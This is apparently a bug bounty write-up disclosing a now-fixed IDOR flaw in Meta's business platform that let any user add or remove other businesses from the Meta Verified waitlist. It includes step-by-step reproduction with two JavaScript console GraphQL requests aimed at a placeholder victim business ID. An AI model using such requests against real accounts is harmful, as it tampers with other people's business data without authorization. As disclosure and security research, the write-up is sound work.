---
title: IDOR - Unauthorized Meta Verified Waitlist Modification
description: The flaw allows any user to modify the verification waitlist for any business simply by knowing its Business ID.
date: 2025-03-15 11:33:00 +0800
categories: [Meta bug bounty]
tags: [Meta]
pin: false
math: true
mermaid: true
---

## 🧾Description

Some countries or individuals are unable to apply for Meta Verified, so there is a waiting list. Users can click a button to join the waiting list. However, I discovered an issue where anyone with a Business ID can manipulate the process by removing a business from the waiting list or even adding it back again.

![image](https://raw.githubusercontent.com/ramzybouyahya/cdnramzy/main/1_Wb2phPJeBmXFbk22225RlA.webp){: width="725"}

---

## ⚙️ Steps to Reproduce

1. **Login as an Attacker**
2. **Go to** `business.facebook.com`
3. **Open Developer Tools → Console tab**
4. **Add a victim Business to the Waitlist**

```js
new AsyncRequest("/api/graphql?variables={'input':{'client_mutation_id':'5','actor_id':'0','business_id':'VICTIM_BUSINESS_ID','event_target':'leave_waitlist_button','surface':'onboarding_join_waitlist_screen','to_join_waitlist':true}}&doc_id=9472506156198781").send()
```

5. **Remove a victim Business from the Waitlist**

```js
new AsyncRequest("/api/graphql?variables={'input':{'client_mutation_id':'5','actor_id':'0','business_id':'VICTIM_BUSINESS_ID','event_target':'join_waitlist_button','surface':'onboarding_join_waitlist_screen','to_join_waitlist':false}}&doc_id=9472506156198781").send()
```

6. **Verification:**

Visit the target business page and observe the change in its waitlist status.

---

## Impact

Some individuals may monopolize access to Meta Verified or prevent competitors from verification by removing them from the list.

---

## Timeline

- **Reported:** March 15, 2025
- **Triaged:** March 31, 2025
- **Fixed:** April 23, 2025
- **Reward:** April 23, 2025

---
